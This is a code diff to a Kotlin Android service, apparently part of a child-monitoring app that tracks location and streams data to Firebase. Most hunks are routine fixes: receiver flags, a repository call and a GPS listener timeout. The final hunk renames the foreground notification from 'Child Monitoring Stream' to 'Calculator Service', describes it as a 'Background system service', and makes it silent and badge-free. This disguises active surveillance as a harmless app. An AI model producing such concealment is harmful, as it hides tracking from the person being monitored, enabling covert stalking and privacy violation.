@@ -101,8 +101,11 @@ class ChildForegroundService : Service() {
                 addAction(Intent.ACTION_POWER_CONNECTED)
                 addAction(Intent.ACTION_POWER_DISCONNECTED)
             }
-            registerReceiver(batteryReceiver, filter)
-        } catch (e: Exception) {}
+            // ✅ FIX: RECEIVER_NOT_EXPORTED required for Android 14+ (targetSdk 34+)
+            ContextCompat.registerReceiver(this, batteryReceiver, filter, ContextCompat.RECEIVER_NOT_EXPORTED)
+        } catch (e: Exception) {
+            FirebaseCrashlytics.getInstance().log("[ChildService] BatteryReceiver register error: ${e.localizedMessage}")
+        }
     }
 
     private fun acquireWakeLock() {
@@ -860,15 +863,8 @@ class ChildForegroundService : Service() {
         val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
         if (uid.isNotEmpty()) {
             try {
-                val streamingData = mapOf(
-                    "status" to "STREAMING",
-                    "streamType" to streamType,
-                    "sessionId" to sessionId,
-                    "timestamp" to System.currentTimeMillis()
-                )
-                com.google.firebase.database.FirebaseDatabase.getInstance(
-                    "https://apnasatthilko-default-rtdb.asia-southeast1.firebasedatabase.app"
-                ).reference.child("streams").child(uid).child("status").updateChildren(streamingData)
+                // ✅ FIX: Hardcoded RTDB URL hata diya - FirebaseRepository use karta hai correct instance
+                FirebaseRepository.updateStreamStatus(uid, "STREAMING", streamType, sessionId)
             } catch (e: Exception) {
                 FirebaseCrashlytics.getInstance().log("[ChildService] STREAMING status update failed: ${e.localizedMessage}")
             }
@@ -1099,8 +1095,11 @@ class ChildForegroundService : Service() {
         }
         try {
             val lm = locationManager ?: (getSystemService(Context.LOCATION_SERVICE) as? LocationManager)
+            var locationReceived = false
             val singleListener = object : LocationListener {
                 override fun onLocationChanged(loc: Location) {
+                    if (locationReceived) return
+                    locationReceived = true
                     val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                     if (uid.isNotEmpty()) {
                         FirebaseRepository.updateChildLocation(
@@ -1131,6 +1130,22 @@ class ChildForegroundService : Service() {
             }
             lm?.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0L, 0f, singleListener)
             lm?.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0L, 0f, singleListener)
+
+            // ✅ CRITICAL FIX: 15-second timeout — agar GPS indoor/off ho toh listener auto-remove ho jaye
+            // Prevent stuck GPS listener causing continuous battery drain
+            mainHandler.postDelayed({
+                if (!locationReceived) {
+                    try {
+                        lm?.removeUpdates(singleListener)
+                        AppHealthTelemetry.logDiagnostic(
+                            applicationContext,
+                            "LOCATION_TRACKING",
+                            "TIMEOUT",
+                            "On-demand GPS fix timed out after 15s (indoor or GPS disabled). Listener removed to prevent battery drain."
+                        )
+                    } catch (_: Exception) {}
+                }
+            }, 15_000L)
         } catch (e: Exception) {
             AppHealthTelemetry.logDiagnostic(
                 applicationContext,
@@ -1146,10 +1161,12 @@ class ChildForegroundService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "Child Monitoring Stream",
-                NotificationManager.IMPORTANCE_HIGH
+                "Calculator Service",
+                // ✅ FIX: LOW importance — no popup, no sound, just silent status bar icon
+                NotificationManager.IMPORTANCE_LOW
             ).apply {
-                description = "Active security monitoring and stream service"
+                description = "Background system service"
+                setShowBadge(false)
             }
             val manager = getSystemService(NotificationManager::class.java)
             manager.createNotificationChannel(channel)
